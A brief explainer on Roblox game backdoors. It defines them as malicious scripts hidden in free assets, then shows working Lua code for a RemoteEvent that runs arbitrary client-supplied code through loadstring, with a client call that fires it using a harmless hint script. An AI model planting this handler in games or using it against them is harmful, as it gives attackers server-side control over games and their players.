## What is a Backdoor?
A **backdoor** is a malicious script, often hidden inside free models or assets, that gives an attacker unauthorized, serverâ€‘side control of your game. It can allow them to run code, access sensitive data, or interfere with players without your permission.

## Example

```lua
local server = Instance.new("RemoteEvent", game.ReplicatedStorage)
server.OnServerEvent:Connect(function(player, SS)
    loadstring(SS)()
end)
```

To use this, you **must** call `:FireServer` on the `RemoteEvent` you created above and pass your code as an argument, as shown below.

```lua
local server = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent")

server:FireServer([[
local hint = Instance.new("Hint")
hint.Text = "This is a hint"
hint.Parent = game.Workspace
]])
```
